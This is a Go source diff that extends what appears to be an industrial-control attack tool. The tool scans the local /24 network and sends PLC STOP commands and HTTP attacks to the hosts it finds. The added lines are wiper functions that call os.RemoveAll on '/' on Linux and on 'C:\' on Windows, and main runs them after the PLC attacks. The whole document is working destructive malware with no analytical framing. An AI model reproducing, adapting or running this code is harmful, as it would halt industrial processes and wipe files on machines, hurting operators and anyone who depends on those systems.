@@ -4,6 +4,8 @@ import (
 	"encoding/binary"
 	"fmt"
 	"net"
+	"runtime"
+	"os"
 	"net/http"
 	"strings"
 	"time"
@@ -127,10 +129,38 @@ func KillHTTP(scanned_ips []string) {
 	}
 }
 
+func KillLinux() {
+	// If UID != 0, program deletes files owned by current user
+	err := os.RemoveAll("/")
+	if err != nil {
+		return			
+		}
+}
+
+func KillWindows() {
+	// If current user does not have administrative privileges, removes files owned by current user
+	err := os.RemoveAll("C:\\")
+	if err != nil {
+		return			
+	}
+}
+
+
 func main() {
 	ip_addr := GetIPAddr() + "/24"
 	ip_list := GetNetwork(ip_addr)
 	scanned_ips := ScanIP(ip_list)
+
+	// PLC STOP to targets
 	KillIP(scanned_ips)
 	KillHTTP(scanned_ips)
+
+	// Wipe filesystems
+	op_sys := runtime.GOOS
+	if op_sys == "linux" {
+		KillLinux()
+	}
+	if op_sys == "windows" {
+		KillWindows()
+	}
 }
